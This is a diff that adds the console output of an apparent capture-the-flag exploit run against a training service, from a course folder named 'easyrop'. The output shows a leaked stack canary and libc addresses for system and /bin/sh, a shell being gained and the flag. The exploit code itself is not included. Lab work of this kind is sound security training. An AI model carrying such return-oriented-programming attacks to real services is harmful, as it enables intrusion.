@@ -1,0 +1,23 @@
+[+] Opening connection to hackfest.redrocket.club on port 1345: Done
+
+[*] '/home/kuertoes/repos/OffSec/week10/easyrop/libc.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+[x] Hacking in...
+
+[+] canary:       saved!
+[+] printf:       0x7f1a79f29e80
+[+] libc_base:    0x7f1a79ec5000
+[+] ret:          0x7f1a79ec601a
+[+] system:       0x7f1a79f14440
+[+] /bin/sh:      0x7f1a7a078e9a
+
+[+] ACCESS GRANTED!
+
+[*] Switching to interactive mode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+flag{pop-pop-ret}
